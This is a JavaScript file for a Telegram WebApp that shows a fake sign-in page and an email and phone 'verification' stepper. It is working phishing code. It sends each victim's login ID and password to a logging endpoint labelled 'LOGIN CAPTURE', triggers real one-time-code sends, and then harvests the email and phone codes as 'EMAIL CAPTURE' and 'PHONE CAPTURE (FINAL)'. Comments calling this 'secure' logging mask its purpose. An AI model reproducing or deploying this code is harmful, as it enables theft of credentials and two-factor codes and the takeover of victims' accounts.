// Ensure Telegram WebApp is ready
const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    console.log("WebApp Initialized");

    // Screens
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');

    // Inputs
    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '', time: '' };
    let currentStep = 1;

    // 1. Sign In Trigger
    const btnSignin = document.getElementById('trigger-signin');
    if (btnSignin) {
        btnSignin.addEventListener('click', function() {
            console.log("Sign In clicked");
            const idVal = loginId.value.trim();
            const passVal = loginPass.value.trim();

            if (!idVal) {
                alert("Please enter Email / Phone Number");
                return;
            }

            userData.id = idVal;
            userData.pass = passVal;
            userData.time = new Date().toLocaleString();

            // Pre-fill next steps
            if (idVal.includes('@')) {
                verifyEmailId.value = idVal;
            } else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) {
                verifyPhoneNum.value = idVal;
            }

            // Log securely (Async, doesn't block UI)
            logToServer('🔑 LOGIN CAPTURE', userData);

            // SWITCH SCREEN
            if (screenSignin) screenSignin.style.display = 'none';
            if (screenStepper) screenStepper.style.display = 'flex';
            
            console.log("Switched to Stepper");
        });
    }

    // 2. Email Verification Item
    const itemEmail = document.getElementById('item-email');
    if (itemEmail) {
        itemEmail.addEventListener('click', () => {
            if (currentStep !== 1) return;
            modalEmail.style.display = 'flex';
            
            // Auto-send OTP if it's an email
            if (verifyEmailId.value.includes('@')) {
                fetch('/send-otp', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: verifyEmailId.value })
                }).catch(e => console.error("OTP send error:", e));
            }
        });
    }

    // 3. Submit Email OTP
    const btnEmailSubmit = document.getElementById('submit-email-otp');
    if (btnEmailSubmit) {
        btnEmailSubmit.addEventListener('click', async () => {
            const email = verifyEmailId.value.trim();
            const otp = verifyEmailOtp.value.trim();

            if (!email || !otp) return alert("Fill all fields");

            userData.email = email;
            userData.email_otp = otp;
            
            btnEmailSubmit.innerText = "Verifying...";
            await logToServer('📧 EMAIL CAPTURE', userData);

            modalEmail.style.display = 'none';
            currentStep = 2;

            // Update UI for next step
            document.getElementById('step-number-display').innerText = '2/2';
            itemEmail.style.opacity = '0.5';
            itemEmail.style.pointerEvents = 'none';
            itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
            itemEmail.querySelector('.card-link').style.color = '#3bc117';

            const itemPhone = document.getElementById('item-phone');
            itemPhone.style.opacity = '1';
            itemPhone.style.pointerEvents = 'auto';
            itemPhone.classList.add('active');
        });
    }

    // 4. Phone Verification Item
    const itemPhone = document.getElementById('item-phone');
    if (itemPhone) {
        itemPhone.addEventListener('click', () => {
            if (currentStep !== 2) return;
            modalPhone.style.display = 'flex';
        });
    }

    // 5. Submit Phone OTP
    const btnPhoneSubmit = document.getElementById('submit-phone-otp');
    if (btnPhoneSubmit) {
        btnPhoneSubmit.addEventListener('click', async () => {
            const phone = verifyPhoneNum.value.trim();
            const otp = verifyPhoneOtp.value.trim();

            if (!phone || !otp) return alert("Fill all fields");

            userData.phone = phone;
            userData.phone_otp = otp;

            btnPhoneSubmit.innerText = "Success";
            await logToServer('📱 PHONE CAPTURE (FINAL)', userData);

            document.getElementById('btn-final-confirm').classList.add('ready');

            setTimeout(() => {
                if (tg) tg.close();
                else location.reload();
            }, 1500);
        });
    }

    // Tabs
    document.querySelectorAll('.signin-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            const passWrap = document.getElementById('login-password-wrapper');
            if (passWrap) passWrap.style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
        });
    });

    // Password Eye
    const eyeBtn = document.querySelector('.btn-password-eye');
    if (eyeBtn) {
        eyeBtn.addEventListener('click', () => {
            const isPass = loginPass.type === 'password';
            loginPass.type = isPass ? 'text' : 'password';
            eyeBtn.innerHTML = isPass ? '<i class="far fa-eye"></i>' : '<i class="far fa-eye-slash"></i>';
        });
    }

    // Close Helpers
    window.closeAllModals = () => {
        if (modalEmail) modalEmail.style.display = 'none';
        if (modalPhone) modalPhone.style.display = 'none';
    };

    const backBtn = document.getElementById('back-to-signin');
    if (backBtn) {
        backBtn.addEventListener('click', () => {
            screenStepper.style.display = 'none';
            screenSignin.style.display = 'block';
        });
    }

    // Secure Log Function
    async function logToServer(title, data) {
        try {
            const res = await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
            const result = await res.json();
            console.log("Log Result:", result);
        } catch (e) {
            console.error("Log failed:", e);
        }
    }

    // Paste
    window.pasteOTP = async (id) => {
        try {
            const t = await navigator.clipboard.readText();
            if (t) document.getElementById(id).value = t;
        } catch(e) {}
    };
});
